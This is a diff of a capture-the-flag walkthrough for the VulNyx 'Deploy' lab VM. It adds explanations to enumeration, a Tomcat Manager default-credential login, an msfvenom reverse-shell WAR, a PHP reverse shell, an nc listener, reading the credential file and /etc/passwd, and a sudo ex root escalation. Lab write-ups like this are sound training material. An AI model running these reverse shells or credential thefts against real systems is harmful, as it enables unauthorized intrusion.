@@ -5,6 +5,7 @@ Deploy is vulnerable Linux virtual machine of low difficulty from the VulNyx pla
 
 ## Solution
 ### Enumeration
+`nmap` detects server 192.168.100.150 (internal domain: deploy.lan) running Linux (Debian 11 based OpenSSH version).
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ nmap -sCV -p- -vv -T4 192.168.100.150
@@ -86,7 +87,15 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 26.27 seconds
            Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
 ```
+There are 3 open ports:
+- 22/tcp: ssh - OpenSSH 8.4p1 Debian 5+debu11u1 
+- 80/tcp: http - Apache httpd 2.4.56 (Debian) - This is Apache's default page when you have not configured a virtual host or deployed any applications.
+- 8080/tcp http - Apache Tomcat - This is Apache Tomcat (popular Java server to run Java/Spring Boot web applications, JSP,...). Tomcat's default page is usually a management page or "Tomcat welcome page".
 
+-> Port 8080 (Tomcat) is the most suspicious: there are often  vulnerabilities in Tomcat Manager.
+
+
+Nikto is a web server vulnerability scanner that specializes in finding common issues such as misconfiguration, default files, missing security headers, dangerous HTTP methods, default accounts, etc.
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ nikto -C all -h 192.168.100.150:8080 
@@ -113,23 +122,37 @@ Nmap done: 1 IP address (1 host up) scanned in 26.27 seconds
 ---------------------------------------------------------------------------
 + 1 host(s) tested
 ```
+This is the most dangerous discovery: **Tomcat Manager** (where applications are managed and deployed) is using the default account:
+- Username: tomcat
+- Password: s3cret
+This is Tomcat's classic default credential pair.
 
+**Tomcat Manager** allows users to upload WAR files (web application archive) and deploy new applications with just a few clicks.
 
 ### Shell (tomcat)
-#### tomcat
+#### Tomcat
+Accessing the address http://192.168.100.150:8080 on the browser we get:
+![manager_webapp](/walkthroughs/vulnyx/low-difficulty/deploy/tomcat.png)
+
+When identifying a Tomcat we go to the `/manager` path (manager webapp). We log in with the account and password we just found  above (`tomcat:s3cret`).
 ![manager_webapp](/walkthroughs/vulnyx/low-difficulty/deploy/manager-webapp.png)
 
 #### Reverse Shell
+##### Create WAR (msfvenom)
+We create a `.war` reverse shell with `msfvenom`.
 ```bash
 ┌──(root㉿kali)-[/home/dungcngo]
 └─# msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.100.172 LPORT=443 -f war > shell.war
 Payload size: 1093 bytes
 Final size of war file: 1093 bytes
 ```
+This is the command to create payload (malicious code) with the `msfvenom` tool (belonging to Metasploit Framework) for the purpose of exploiting Tomcat.
+
+##### Upload and Run WAR
+Now we upload the `.war` file and when we deploy it we get a shell as a `tomcat` user.
 ![upload_file_war](/walkthroughs/vulnyx/low-difficulty/deploy/upload_war_file.png)
 
-![shell.war](/walkthroughs/vulnyx/low-difficulty/deploy/shell.png)
-
+Use `nc` to open a listening socket on the machine's port 443 to wait for incoming TCP connections.
 ```bash                                                           
 ┌──(root㉿kali)-[/home/dungcngo]
 └─# nc -lvnp 443
@@ -144,6 +167,8 @@ which python3
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 tomcat@deploy:/var/lib/tomcat9$ 
 ```
+Visit http://192.168.100.150:8080/shell
+![shell.war](/walkthroughs/vulnyx/low-difficulty/deploy/shell.png)
 
 ```bash
 tomcat@deploy:/var/lib/tomcat9$ ls
@@ -162,6 +187,7 @@ drwxrwxr-x  4 tomcat tomcat 4096 abr 15 10:31 webapps
 lrwxrwxrwx  1 root   root     19 abr  5  2023 work -> ../../cache/tomcat9
 tomcat@deploy:/var/lib/tomcat9$ 
 ```
+We already have a reverse shell from the target machine to our machine. We move into Tomcat's configuration directory `/etc/tomcat9`, this is where the important configuration files of the Tomcat service are located.
 ```bash
 tomcat@deploy:/var/lib/tomcat9$ cd /etc/tomcat9
 cd /etc/tomcat9
@@ -183,6 +209,10 @@ cat tomcat-users.xml
 </tomcat-users>
 tomcat@deploy:/etc/tomcat9$ 
 ```
+When listing the content, we see files such as `server.xml`, `context.xml`, `web.xml` and especially `tomcat-users.xml`. This is the file used to define users, passwords and roles in Tomcat.
+
+We can see another user commented `sa:salala!!`.
+
 ```bash
 tomcat@deploy:/etc/tomcat9$ cat /etc/passwd
 cat /etc/passwd
@@ -215,8 +245,10 @@ toor:x:1000:1000:toor,,,:/home/toor:/bin/bash
 tomcat:x:998:998:Apache Tomcat:/var/lib/tomcat:/usr/sbin/nologin
 sa:x:1001:1001::/home/sa:/usr/bin/bash
 ```
+We can see `user` `sa` in the `/etc/passwd` file.
 
 ### Shell (sa)
+We log in using SSH to the target machine with the account `sa`.
 ```bash
 ┌──(dungcngo㉿kali)-[~]
 └─$ ssh sa@192.168.100.150 
@@ -327,6 +359,8 @@ sa          7932  0.0  0.4   7900  4712 pts/1    Ss   10:38   0:00 -bash
 root        7994  0.2  0.0      0     0 ?        I    10:40   0:00 [kworker/0:0-ata_s
 sa          8005  0.0  0.3   9756  3352 pts/1    R+   10:42   0:00 ps aux
 ```
+Reviewing the process of the `user toor`, we see that he has an Apache2 HTTP server.
+
 ```bash
 sa@deploy:~$ ls -la /var/www/html
 total 20
@@ -334,6 +368,9 @@ drwxrwxrwx 2 www-data www-data  4096 may 11  2023 .
 drwxrwxrwx 3 www-data www-data  4096 may 10  2023 ..
 -rwxrwxrwx 1 www-data www-data 10701 may 10  2023 index.html
 ```
+We have permission to write to the `/var/www/html` path.
+
+Locate the PHP reverse shell scripts available in Kali, then copy and create a new script  on the `/var/www/html` of the user `sa`.
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ locate php-reverse-shell.php
@@ -344,6 +381,7 @@ drwxrwxrwx 3 www-data www-data  4096 may 10  2023 ..
 ![php-reverse-shell](/walkthroughs/vulnyx/low-difficulty/deploy/php-reverse-shell.png)
 
 ### Shell (toor)
+We access the address `http://192.168.100.150/php-reverse-shell.php` in the browser then use `nc` to open the socket to listen for connections on the port 443, we get a reverse shell:
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ nc -lvnp 443                        
@@ -368,6 +406,7 @@ toor@deploy:/$
 ```
 
 ### Previlege Escalation
+The `toor` user can run the `ex` binary as `root` with sudo.
 ```bash
 toor@deploy:/$ sudo -l
 sudo -l
@@ -385,6 +424,8 @@ E558: Terminal entry not found in terminfo
     builtin_ansi
 Entering Ex mode.  Type "visual" to go to Normal mode.
 ```
+When we run `ex` it opens in paginated mode and with `!/bin/bash` we become a `root` user.
+
 ```bash
 # id; hostname
 id; hostname
@@ -398,6 +439,7 @@ dev   initrd.img.old  libx32      opt    sbin  usr
 etc   lib             lost+found  proc   srv   var
 # 
 ```
+Check the location of files containing flags and read them.
 ```bash
 # find / -name user.txt
 find / -name user.txt
@@ -414,7 +456,6 @@ cat root.txt
 cat /home/toor/user.txt
 d9bad39df709796d0eccb92a55f85e73
 ```
-
 
 ***You are welcome!***
 
